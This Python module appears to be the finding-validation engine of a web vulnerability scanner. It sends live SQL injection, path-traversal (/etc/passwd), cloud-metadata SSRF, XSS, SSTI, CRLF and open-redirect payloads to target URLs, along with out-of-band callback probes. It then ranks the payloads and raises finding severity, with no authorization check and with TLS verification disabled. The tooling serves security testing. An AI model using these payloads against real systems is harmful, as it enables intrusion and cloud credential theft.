"""
engine/validation_engine.py — Full Validation Engine v2

Real HTTP execution:
  1. Session-aware replay (GET/POST/JSON/multipart, cookies, Authorization)
  2. Stability: probe 3-5x, median timing, IQR outlier removal
  3. Payload mutation via payload_intel.select_payloads() -- test top N, pick best
  4. OOB integration -- DNS/HTTP callback detection for SSRF, blind bugs
  5. Chain validation -- live HTTP confirmation of finding combinations
  6. Severity upgrade -- escalates based on confirmed evidence signals
  7. Full evidence storage: raw request, raw response, diff, timing series, headers

Emits:
  [eil] exploit_attempt   -- each probe attempt
  [eil] payload_selected  -- best-signal payload chosen
  [eil] oob_triggered     -- OOB payload injected
  [eil] oob_callback      -- DNS/HTTP callback received
  [eil] chain_success     -- exploit chain confirmed
  [eil] severity_upgraded -- severity raised based on evidence
  [eil] validation_passed / validation_failed
"""
import hashlib, json, re, time, ssl, logging, statistics
import urllib.parse, urllib.request, urllib.error
from typing import Dict, List, Optional, Tuple

log = logging.getLogger("elite.validation_engine")

_UA = "Mozilla/5.0 (compatible; TMR-ValidationEngine/2.0)"

def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def _raw_request_line(method, url, headers, body):
    p = urllib.parse.urlparse(url)
    path = p.path or "/"
    if p.query: path += "?" + p.query
    lines = [f"{method} {path} HTTP/1.1", f"Host: {p.netloc}"]
    for k, v in headers.items():
        if k.lower() != "host": lines.append(f"{k}: {v}")
    lines.append("")
    if body:
        try: lines.append(body.decode("utf-8", errors="replace"))
        except: lines.append(f"<binary {len(body)} bytes>")
    return "\r\n".join(lines)

def _req(url, method="GET", headers=None, body=None,
         cookie="", auth_header="", content_type="",
         timeout=12, allow_redirects=True):
    hdrs = {"User-Agent": _UA, "Accept": "*/*"}
    if cookie: hdrs["Cookie"] = cookie
    if auth_header: hdrs["Authorization"] = auth_header
    if content_type: hdrs["Content-Type"] = content_type
    elif body and method in ("POST","PUT","PATCH"):
        try: json.loads(body); hdrs["Content-Type"] = "application/json"
        except: hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    hdrs.update(headers or {})
    raw_req = _raw_request_line(method, url, hdrs, body)
    t0 = time.monotonic()
    try:
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        ctx_h = urllib.request.HTTPSHandler(context=_ssl_ctx())
        opener = urllib.request.build_opener(ctx_h)
        with opener.open(req, timeout=timeout) as r:
            rb = r.read(65536).decode("utf-8", errors="replace")
            rh = dict(r.headers)
            return {"status": r.status, "headers": rh, "body": rb,
                    "elapsed": round(time.monotonic()-t0, 3), "error": None,
                    "raw_request": raw_req,
                    "raw_response": f"HTTP/1.1 {r.status}\r\n" +
                        "\r\n".join(f"{k}: {v}" for k,v in rh.items()) +
                        f"\r\n\r\n{rb[:2000]}"}
    except urllib.error.HTTPError as e:
        try: rb = e.read(4096).decode("utf-8", errors="replace")
        except: rb = ""
        el = round(time.monotonic()-t0, 3)
        return {"status": e.code, "headers": dict(e.headers), "body": rb,
                "elapsed": el, "error": None, "raw_request": raw_req,
                "raw_response": f"HTTP/1.1 {e.code}\r\n\r\n{rb[:1000]}"}
    except Exception as e:
        return {"status": 0, "headers": {}, "body": "",
                "elapsed": round(time.monotonic()-t0, 3), "error": str(e)[:120],
                "raw_request": raw_req, "raw_response": ""}

def _inject_url(url, param, value):
    if not param: return url
    try:
        p = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
        qs[param] = [value]
        return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(qs, doseq=True)))
    except:
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}{param}={urllib.parse.quote_plus(str(value))}"

def _inject_body(body_str, content_type, param, value):
    ct = (content_type or "").lower()
    if "json" in ct:
        try:
            obj = json.loads(body_str)
            if isinstance(obj, dict) and param: obj[param] = value
            return json.dumps(obj).encode()
        except: return (body_str or "").encode()
    else:
        try:
            qs = urllib.parse.parse_qs(body_str or "", keep_blank_values=True)
            if param: qs[param] = [value]
            return urllib.parse.urlencode(qs, doseq=True).encode()
        except: return (body_str or "").encode()

def _stable_timing(url, method, headers, body, cookie, auth_header,
                   content_type, n=4, timeout=15):
    times = []; last_resp = None
    for _ in range(n):
        r = _req(url, method=method, headers=headers, body=body,
                 cookie=cookie, auth_header=auth_header,
                 content_type=content_type, timeout=timeout)
        if r["error"] is None:
            times.append(r["elapsed"]); last_resp = r
        time.sleep(0.12)
    if not times:
        return {"median":0,"mean":0,"min":0,"max":0,"samples":[],
                "q1":0,"q3":0,"stable":False,"response":last_resp}
    times.sort()
    if len(times) >= 4:
        q1 = statistics.quantiles(times, n=4)[0]
        q3 = statistics.quantiles(times, n=4)[2]
        iqr = q3 - q1
        lo, hi = q1-1.5*iqr, q3+1.5*iqr
        clean = [t for t in times if lo <= t <= hi] or times
    else:
        q1 = times[0]; q3 = times[-1]; clean = times
    return {"median": round(statistics.median(clean),3),
            "mean":   round(statistics.mean(clean),3),
            "min":    round(min(clean),3), "max": round(max(clean),3),
            "samples": times, "clean_samples": clean,
            "q1": round(q1,3), "q3": round(q3,3),
            "stable": statistics.stdev(clean)<0.3 if len(clean)>1 else True,
            "response": last_resp}

def _get_ranked_payloads(bug, param="", surface="", n=8):
    try:
        from engine.payload_intel import select_payloads
        pl = select_payloads(bug_type=bug, param_name=param, surface=surface, top_n=n)
        if pl: return pl[:n]
    except Exception as e:
        log.debug(f"[eil] payload_intel: {e}")
    _defaults = {
        "sqli":  ["' AND SLEEP(5)--","' OR SLEEP(5)--","1 AND SLEEP(5)--",
                  "';WAITFOR DELAY '0:0:5'--","'",'""'],
        "lfi":   ["../../../etc/passwd","../../etc/passwd","....//....//etc/passwd",
                  "..%2F..%2Fetc%2Fpasswd","%2e%2e/%2e%2e/etc/passwd"],
        "xss":   ["<tmr-xss>","<img src=x onerror=tmr>","\"-tmr-\"",
                  "javascript:tmr//","'-tmr-'"],
        "ssti":  ["{{7*7}}","#{7*7}","${7*7}","<%=7*7%>","{{config}}"],
        "ssrf":  ["http://169.254.169.254/latest/meta-data/",
                  "http://metadata.google.internal/computeMetadata/v1/",
                  "http://localhost/"],
        "crlf":  ["%0d%0aX-TMR-Injected: confirmed",
                  "%0aX-TMR-Injected: confirmed"],
        "redirect":["https://evil-tmr-test.com","//evil-tmr-test.com",
                    "https://evil-tmr-test.com%23"],
    }
    return _defaults.get(bug, ["tmr-test-payload"])

def _test_payload(url, method, param, payload, orig_body, content_type, session, timeout):
    cookie = session.get("cookie",""); auth = session.get("auth_header","")
    extra  = session.get("extra_headers",{})
    if method in ("POST","PUT","PATCH") and orig_body is not None:
        body_bytes = _inject_body(orig_body, content_type, param, payload)
        return _req(url, method=method, headers=extra, body=body_bytes,
                    cookie=cookie, auth_header=auth,
                    content_type=content_type, timeout=timeout)
    else:
        probe_url = _inject_url(url, param, payload)
        return _req(probe_url, method="GET", headers=extra,
                    cookie=cookie, auth_header=auth, timeout=timeout)

_SIGNAL_RE = {
    "sqli":   re.compile(r"(sql syntax|mysql_fetch|ORA-\d{4}|SQLSTATE|unclosed quotation|quoted string|syntax error.*near|division by zero)", re.I),
    "lfi":    re.compile(r"(root:\s*[x*]?:\d+:\d+:|daemon:.*?:/|nobody:.*?:/|\[boot loader\]|for 16-bit app support)", re.I),
    "xss":    re.compile(r"<tmr-xss>|tmr-xss|onerror=tmr", re.I),
    "ssti":   re.compile(r"\b49\b"),
    "crlf":   re.compile(r"x-tmr-injected", re.I),
    "redirect":re.compile(r"evil-tmr-test\.com", re.I),
    "ssrf":   re.compile(r"(ami-id|instance-id|computeMetadata|169\.254\.169\.254|metadata\.google\.internal)", re.I),
}

def _select_best_payload(bug, url, method, param, payloads, orig_body,
                         content_type, session, timeout, out_logs=None):
    best_payload = None; best_response = {}; best_score = 0
    if out_logs is None: out_logs = []
    for payload in payloads:
        msg = f"[eil] exploit_attempt bug={bug} payload={payload[:40]!r}"
        log.info(msg); out_logs.append(msg)
        resp = _test_payload(url, method, param, payload,
                             orig_body, content_type, session, timeout)
        if resp.get("error"): continue
        score = 0; body = resp.get("body",""); hdrs = resp.get("headers",{})
        rx = _SIGNAL_RE.get(bug)
        if rx and rx.search(body): score += 80
        if payload[:8].lower() in body.lower(): score += 40
        if bug == "sqli" and resp["elapsed"] >= 4.5: score += 90
        if bug == "crlf":
            if any("x-tmr-injected" in k.lower() for k in hdrs): score += 100
        if bug == "redirect":
            loc = hdrs.get("Location","") or hdrs.get("location","")
            if "evil-tmr-test.com" in loc: score += 100
        if score > best_score:
            best_score = score; best_payload = payload; best_response = resp
    if best_payload:
        msg = f"[eil] payload_selected bug={bug} payload={best_payload[:40]!r} score={best_score}"
        log.info(msg); out_logs.append(msg)
    return best_payload, best_response, best_score

def _detect_signals(bug, probe_resp, baseline_resp, neg_resp, payload):
    signals = []; conf_delta = 0
    probe_body    = probe_resp.get("body","")
    probe_hdrs    = {k.lower():v for k,v in probe_resp.get("headers",{}).items()}
    baseline_body = baseline_resp.get("body","")
    neg_body      = neg_resp.get("body","")
    if bug in ("sqli","sqli_blind","sqli_time"):
        m = _SIGNAL_RE["sqli"].search(probe_body)
        if m and not _SIGNAL_RE["sqli"].search(baseline_body) and not _SIGNAL_RE["sqli"].search(neg_body):
            signals.append(f"sql_error: {m.group(0)[:50]!r}"); conf_delta += 40
        td = probe_resp.get("elapsed",0) - baseline_resp.get("elapsed",0)
        if td >= 4.5 and baseline_resp.get("elapsed",9) < 2.0:
            signals.append(f"timing_delta: {td:.1f}s"); conf_delta += 45
    elif bug == "lfi":
        m = _SIGNAL_RE["lfi"].search(probe_body)
        if m and not _SIGNAL_RE["lfi"].search(baseline_body) and not _SIGNAL_RE["lfi"].search(neg_body):
            signals.append(f"lfi_marker: {m.group(0)[:40]!r}"); conf_delta += 50
    elif bug in ("xss","stored_xss"):
        marker = payload[:12] if payload else "<tmr-xss>"
        if marker.lower() in probe_body.lower() and marker.lower() not in neg_body.lower():
            idx = probe_body.lower().find(marker.lower())
            ctx = probe_body[max(0,idx-10):idx+30]
            if "&lt;" not in ctx and "&#" not in ctx:
                signals.append(f"xss_reflection: {ctx[:40]!r}"); conf_delta += 45
            else: conf_delta -= 10
    elif bug == "ssti":
        if "49" in probe_body and "49" not in baseline_body and "49" not in neg_body:
            signals.append("ssti_eval: {{7*7}} = 49"); conf_delta += 50
    elif bug in ("ssrf","ssrf_cloud","ssrf_aws"):
        m = _SIGNAL_RE["ssrf"].search(probe_body)
        if m and not _SIGNAL_RE["ssrf"].search(baseline_body):
            signals.append(f"ssrf_internal: {m.group(0)!r}"); conf_delta += 55
    elif bug == "crlf":
        if "x-tmr-injected" in probe_hdrs:
            signals.append("crlf_header_injected: " + repr(probe_hdrs.get('x-tmr-injected'))); conf_delta += 50
    elif bug in ("redirect","open_redirect"):
        loc = probe_hdrs.get("location","")
        if "evil-tmr-test.com" in loc and probe_resp.get("status",0) in (301,302,303,307,308):
            signals.append(f"redirect_confirmed: {loc[:60]}"); conf_delta += 50
    elif bug in ("cors","cors_deep"):
        acao = probe_hdrs.get("access-control-allow-origin","")
        acac = probe_hdrs.get("access-control-allow-credentials","")
        if "evil-tmr-cors.com" in acao:
            signals.append(f"cors_acao: {acao!r}"); conf_delta += 35
            if acac and "true" in acac.lower():
                signals.append("cors_acac: true"); conf_delta += 20
    else:
        if abs(len(probe_body)-len(baseline_body)) > 50:
            signals.append(f"body_len_delta: {len(probe_body)-len(baseline_body)}"); conf_delta += 10
    return bool(signals), signals, conf_delta

def _upgrade_severity(bug, orig_severity, signals, oob_confirmed, chain_confirmed):
    _ORDER = ["info","low","medium","high","critical"]
    current = (orig_severity or "medium").lower(); reason = None; new_sev = current
    if any("ssrf_internal" in s for s in signals):
        if current != "critical": new_sev = "critical"; reason = "internal metadata/service access confirmed"
    if any("iam" in s.lower() or "security-credentials" in s.lower() for s in signals):
        new_sev = "critical"; reason = "IAM credentials exposed via SSRF"
    if oob_confirmed:
        if current in ("info","low","medium"): new_sev = "high"; reason = "OOB DNS/HTTP callback received"
        elif current == "high": new_sev = "critical"; reason = "OOB callback + high severity"
    if chain_confirmed:
        idx = _ORDER.index(new_sev)
        if idx < len(_ORDER)-1: new_sev = _ORDER[idx+1]; reason = "exploitation chain confirmed"
    if bug == "lfi" and any("root:" in s for s in signals):
        if _ORDER.index(new_sev) < _ORDER.index("high"):
            new_sev = "high"; reason = "/etc/passwd confirmed via LFI"
    if new_sev != current:
        log.info(f"[eil] severity_upgraded old={current} new={new_sev} reason={reason}")
    return new_sev, reason

def _oob_validate(url, method, param, orig_body, content_type, session, timeout_wait=15):
    result = {"oob_used":False,"oob_host":"","oob_callback":False,"callback_data":None,"logs":[]}
    try:
        from engine.oob import get_oob_client
        client = get_oob_client(); oob_host = client.host
        if not oob_host:
            result["logs"].append("[eil] oob_skipped: no OOB host"); return result
        unique_id = hashlib.md5(f"{url}{param}{time.time()}".encode()).hexdigest()[:8]
        oob_payload = f"http://{unique_id}.{oob_host}/"
        result["oob_used"] = True; result["oob_host"] = oob_host
        log.info(f"[eil] oob_triggered url={url[:60]} param={param} host={oob_host}")
        result["logs"].append(f"[eil] oob_triggered url={url[:60]} param={param} oob_host={oob_host}")
        _test_payload(url, method, param, oob_payload, orig_body, content_type, session, timeout=10)
        callback = client.wait_for_callback(timeout=timeout_wait)
        if callback:
            result["oob_callback"] = True; result["callback_data"] = callback
            log.info(f"[eil] oob_callback type={callback.get('protocol','?')} from={callback.get('remote-address','?')}")
            result["logs"].append(f"[eil] oob_callback type={callback.get('protocol','?')} from={callback.get('remote-address','?')}")
        else:
            result["logs"].append(f"[eil] oob_callback timeout ({timeout_wait}s)")
    except Exception as e:
        result["logs"].append(f"[eil] oob_error: {e}")
    return result

def validate_chain(findings, session=None, timeout=10):
    result = {"chain_found":False,"chain_confirmed":False,"chain_name":"","chain_steps":[],"logs":[]}
    session = session or {}
    try:
        from engine.chain import find_chains
        chains = find_chains(findings)
    except Exception as e:
        result["logs"].append(f"[eil] chain_detect error: {e}"); return result
    if not chains:
        result["logs"].append("[eil] no chains detected"); return result
    chains.sort(key=lambda c: {"critical":4,"high":3,"medium":2,"low":1}.get(c.get("severity","low"),1), reverse=True)
    chain = chains[0]; result["chain_found"] = True; result["chain_name"] = chain.get("name","")
    result["logs"].append(f"[eil] chain_detected name={chain['name']} legs={len(chain.get('findings',{}))}")
    confirmed_legs = 0; step_results = []
    for bug, leg_finding in chain.get("findings",{}).items():
        url = leg_finding.get("url",""); param = leg_finding.get("param","")
        if not url: continue
        payloads = _get_ranked_payloads(bug, param, n=3)
        best_pl, best_resp, best_score = _select_best_payload(
            bug, url, leg_finding.get("method","GET"), param,
            payloads, leg_finding.get("orig_body"), "", session, timeout,
            out_logs=result["logs"])
        leg_confirmed = best_score > 50
        if leg_confirmed: confirmed_legs += 1
        step_results.append({"bug":bug,"url":url[:80],"confirmed":leg_confirmed,"score":best_score,"payload":best_pl})
    result["chain_steps"] = step_results
    result["chain_confirmed"] = confirmed_legs == len(chain.get("findings",{})) and confirmed_legs > 0
    if result["chain_confirmed"]:
        log.info(f"[eil] chain_success name={chain['name']} steps={confirmed_legs}")
        result["logs"].append(f"[eil] chain_success name={chain['name']} steps={confirmed_legs}")
    else:
        result["logs"].append(f"[eil] chain_partial confirmed={confirmed_legs}/{len(chain.get('findings',{}))}")
    return result

def validate_finding(finding, timeout=12, probe_count=4, use_oob=True, all_findings=None):
    logs = []
    bug   = (finding.get("bug") or finding.get("bug_type") or "").lower()
    url   = finding.get("url",""); param = (finding.get("param") or "").lower()
    method = (finding.get("method") or "GET").upper()
    orig_severity = finding.get("severity","medium")
    orig_conf = int(finding.get("confidence",50))
    orig_body = finding.get("orig_body") or finding.get("body")
    content_type = finding.get("content_type","")
    if not url:
        return {"confirmed":False,"confidence":orig_conf,"proof":"no URL","evidence":{},"logs":["[eil] no_url"]}
    session = {"cookie": finding.get("cookie",""),
               "auth_header": finding.get("auth_header","") or finding.get("authorization",""),
               "extra_headers": finding.get("extra_headers",{})}
    if session["cookie"] or session["auth_header"]:
        logs.append(f"[eil] session_loaded: cookie={'yes' if session['cookie'] else 'no'} auth={'yes' if session['auth_header'] else 'no'}")
    payloads = _get_ranked_payloads(bug, param, n=8)
    logs.append(f"[eil] payloads_loaded bug={bug} count={len(payloads)}")
    baseline_url = _inject_url(url, param, "tmr-baseline-xzq9")
    baseline_body_bytes = None
    if method in ("POST","PUT","PATCH") and orig_body:
        baseline_body_bytes = _inject_body(orig_body, content_type, param, "tmr-baseline-xzq9")
    baseline_stats = _stable_timing(baseline_url, method,
        session.get("extra_headers",{}), baseline_body_bytes,
        session.get("cookie",""), session.get("auth_header",""),
        content_type, n=probe_count, timeout=timeout)
    baseline_resp = baseline_stats.get("response") or {}
    logs.append(f"[eil] baseline status={baseline_resp.get('status')} median={baseline_stats['median']}s stable={baseline_stats['stable']} samples={baseline_stats['samples']}")
    neg_url = _inject_url(url, param, "tmr-negative-ctrl-9z1")
    neg_resp = _req(neg_url, cookie=session.get("cookie",""),
                    auth_header=session.get("auth_header",""), timeout=timeout)
    logs.append(f"[eil] negative_control status={neg_resp.get('status')} elapsed={neg_resp.get('elapsed')}s")
    best_payload, best_resp, best_score = _select_best_payload(
        bug, url, method, param, payloads, orig_body, content_type, session, timeout,
        out_logs=logs)
    if not best_payload or not best_resp:
        # All probes failed (e.g. WAF blocks, network error) — still return full evidence
        logs.append(f"[eil] validation_failed bug={bug} reason=all_probes_failed payloads_tried={len(payloads)}")
        return {"confirmed":False,
                "confidence":max(0,orig_conf-20),
                "severity":orig_severity,
                "proof":f"all {len(payloads)} probes failed (no valid response)",
                "signals":[],"best_payload":None,
                "evidence":{
                    "baseline":  {"url":baseline_url[:120],
                                  "status":baseline_resp.get("status"),
                                  "elapsed":baseline_resp.get("elapsed"),
                                  "body_len":len(baseline_resp.get("body","")),
                                  "raw_request":baseline_resp.get("raw_request",""),
                                  "raw_response":baseline_resp.get("raw_response","")[:500]},
                    "probe":     {"url":"","payload":None,"status":None,"elapsed":None,
                                  "body_len":0,"body_preview":"","headers":{},
                                  "raw_request":"","raw_response":""},
                    "negative":  {"url":neg_url[:120],"status":neg_resp.get("status"),
                                  "elapsed":neg_resp.get("elapsed"),
                                  "body_len":len(neg_resp.get("body",""))},
                    "timing_series": {"baseline_samples":baseline_stats.get("samples",[]),
                                      "baseline_median":baseline_stats.get("median",0),
                                      "probe_elapsed":None,"timing_delta":None,
                                      "baseline_stable":baseline_stats.get("stable",True)},
                    "body_diff": {},"header_changes":[],"signals":[],
                    "best_score":0,"payloads_tried":len(payloads),
                    "oob":{},"chain":{},
                    "severity_upgrade":{"original":orig_severity,"final":orig_severity,"reason":None}},
                "validation_plan":{"bug":bug,"url":url,"param":param,
                                   "method":method,"payloads_tried":len(payloads)},
                "logs":logs}
    logs.append(f"[eil] probe_completed status={best_resp.get('status')} elapsed={best_resp.get('elapsed')}s payload={best_payload[:40]!r}")
    confirmed, signals, conf_delta = _detect_signals(bug, best_resp, baseline_resp, neg_resp, best_payload)
    logs.append(f"[eil] signals confirmed={confirmed} signals={signals} conf_delta={conf_delta:+d}")
    oob_result = {}; oob_confirmed = False
    if use_oob and bug in ("ssrf","ssrf_cloud","ssrf_aws","rce","xxe","ssti","log4j"):
        oob_result = _oob_validate(url, method, param, orig_body, content_type, session, timeout_wait=15)
        oob_confirmed = oob_result.get("oob_callback",False)
        logs.extend(oob_result.get("logs",[]))
        if oob_confirmed: confirmed = True; conf_delta += 40; signals.append("oob_callback_confirmed")
    chain_result = {}; chain_confirmed = False
    if all_findings and len(all_findings) > 1:
        chain_result = validate_chain([finding]+all_findings, session, timeout)
        chain_confirmed = chain_result.get("chain_confirmed",False)
        logs.extend(chain_result.get("logs",[]))
    new_severity, upgrade_reason = _upgrade_severity(bug, orig_severity, signals, oob_confirmed, chain_confirmed)
    if upgrade_reason:
        logs.append(f"[eil] severity_upgraded old={orig_severity} new={new_severity} reason={upgrade_reason}")
    new_conf = max(0, min(100, orig_conf + conf_delta))
    timing_series = {"baseline_samples": baseline_stats.get("samples",[]),
                     "baseline_median":  baseline_stats.get("median",0),
                     "probe_elapsed":    best_resp.get("elapsed",0),
                     "timing_delta":     round(best_resp.get("elapsed",0)-baseline_stats.get("median",0),3),
                     "baseline_stable":  baseline_stats.get("stable",True)}
    def _diff_bodies(a,b):
        wa=set(re.findall(r"\w+",a)); wb=set(re.findall(r"\w+",b))
        return {"len_delta":len(b)-len(a),"added_tokens":list(wb-wa)[:20],
                "removed_tokens":list(wa-wb)[:20],"diff_score":round(abs(len(b)-len(a))/max(len(a),1),3)}
    def _hdiff(b,p):
        bl={k.lower():v for k,v in b.items()}; pl={k.lower():v for k,v in p.items()}
        changes=[]
        for k,v in pl.items():
            if k not in bl: changes.append({"type":"added","header":k,"value":v})
            elif bl[k]!=v: changes.append({"type":"changed","header":k,"from":bl[k],"to":v})
        for k in bl:
            if k not in pl: changes.append({"type":"removed","header":k})
        return changes
    evidence = {
        "baseline":       {"url":baseline_url[:120],"status":baseline_resp.get("status"),
                           "elapsed":baseline_resp.get("elapsed"),"body_len":len(baseline_resp.get("body","")),
                           "raw_request":baseline_resp.get("raw_request",""),
                           "raw_response":baseline_resp.get("raw_response","")[:1000]},
        "probe":          {"url":_inject_url(url,param,best_payload)[:120],"payload":best_payload,
                           "status":best_resp.get("status"),"elapsed":best_resp.get("elapsed"),
                           "body_len":len(best_resp.get("body","")),"body_preview":best_resp.get("body","")[:300],
                           "headers":best_resp.get("headers",{}),"raw_request":best_resp.get("raw_request",""),
                           "raw_response":best_resp.get("raw_response","")[:1500]},
        "negative":       {"url":neg_url[:120],"status":neg_resp.get("status"),
                           "elapsed":neg_resp.get("elapsed"),"body_len":len(neg_resp.get("body",""))},
        "timing_series":  timing_series,
        "body_diff":      _diff_bodies(baseline_resp.get("body",""),best_resp.get("body","")),
        "header_changes": _hdiff(baseline_resp.get("headers",{}),best_resp.get("headers",{})),
        "signals":        signals,"best_score":best_score,"payloads_tried":len(payloads),
        "oob":oob_result,"chain":chain_result,
        "severity_upgrade":{"original":orig_severity,"final":new_severity,"reason":upgrade_reason}}
    proof = (f"confirmed: {signals[0]}" if signals else
             f"not confirmed (score={best_score}, delta={timing_series['timing_delta']:.1f}s)")
    if confirmed:
        logs.append(f"[eil] validation_passed bug={bug} confidence={orig_conf}->{new_conf} proof={proof[:80]}")
    else:
        logs.append(f"[eil] validation_failed bug={bug} confidence={orig_conf}->{new_conf} proof={proof[:80]}")
    log.info(f"[eil] validation_{'passed' if confirmed else 'failed'} bug={bug} conf={orig_conf}->{new_conf} sev={orig_severity}->{new_severity}")
    return {"confirmed":confirmed,"confidence":new_conf,"severity":new_severity,
            "severity_reason":upgrade_reason,"proof":proof,"signals":signals,
            "best_payload":best_payload,"evidence":evidence,
            "validation_plan":{"bug":bug,"url":url,"param":param,"method":method,"payloads_tried":len(payloads)},
            "logs":logs}

def auto_validate(finding, db=None, domain="", timeout=12, all_findings=None):
    result = validate_finding(finding, timeout=timeout, all_findings=all_findings)
    finding.update({"eil_validated":True,"eil_confirmed":result["confirmed"],
                    "eil_confidence":result["confidence"],"eil_proof":result["proof"],
                    "eil_evidence":result["evidence"],"eil_logs":result["logs"],
                    "eil_severity":result.get("severity",finding.get("severity","medium")),
                    "eil_severity_reason":result.get("severity_reason"),
                    "confidence":result["confidence"],
                    "severity":result.get("severity",finding.get("severity","medium")),
                    "likely_fp": not result["confirmed"]})
    if db and domain and finding.get("url"):
        try:
            db.update_finding(domain, finding["url"], finding.get("bug",""),
                              {"eil_validated":True,"eil_confirmed":result["confirmed"],
                               "eil_confidence":result["confidence"],"eil_proof":result["proof"],
                               "confidence":result["confidence"],"severity":result.get("severity"),
                               "likely_fp": not result["confirmed"]})
        except Exception as e: log.debug(f"[eil] db: {e}")
    return finding

def batch_validate(findings, db=None, domain="", timeout=12, max_workers=3):
    from concurrent.futures import ThreadPoolExecutor, as_completed
    results=[]; confirmed=failed=0
    def _v(f): return auto_validate(f, db=db, domain=domain, timeout=timeout, all_findings=findings)
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        fts = {ex.submit(_v,f):f for f in findings}
        for ft in as_completed(fts):
            try:
                r=ft.result(); results.append(r)
                if r.get("eil_confirmed"): confirmed+=1
                else: failed+=1
            except Exception as e:
                orig=fts[ft]; orig.update({"eil_validated":False,"eil_error":str(e)}); results.append(orig); failed+=1
    log.info(f"[eil] batch_validate count={len(findings)} confirmed={confirmed} failed={failed}")
    return results
